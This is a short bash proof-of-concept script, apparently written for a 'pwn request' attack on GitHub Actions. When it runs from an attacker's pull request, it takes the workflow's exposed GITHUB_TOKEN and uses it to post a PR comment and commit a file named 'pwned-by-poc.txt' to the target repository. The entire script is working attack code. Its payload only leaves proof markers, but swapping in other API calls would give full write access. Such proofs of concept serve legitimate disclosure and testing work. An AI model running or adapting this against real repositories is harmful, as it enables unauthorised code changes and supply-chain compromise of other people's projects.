#!/bin/bash

echo "Running Pwn Request PoC"

PR_NUMBER=$(echo "$GITHUB_REF" | cut -d'/' -f3)

echo "Using token to perform authenticated actions..."

# 1️⃣ Comment on PR
curl -s -X POST \
  -H "Authorization: Bearer $GITHUB_TOKEN" \
  -H "Accept: application/vnd.github+json" \
  https://api.github.com/repos/${GITHUB_REPOSITORY}/issues/${PR_NUMBER}/comments \
  -d "{\"body\":\"✅ Token is valid and used from attacker-controlled code\"}"

# 2️⃣ Create a new file in repo (STRONG PROOF)
curl -s -X PUT \
  -H "Authorization: Bearer $GITHUB_TOKEN" \
  -H "Accept: application/vnd.github+json" \
  https://api.github.com/repos/${GITHUB_REPOSITORY}/contents/pwned-by-poc.txt \
  -d "{
    \"message\": \"pwn request poc\",
    \"content\": \"$(echo 'This file was created via exposed GITHUB_TOKEN' | base64 -w 0)\"
  }"
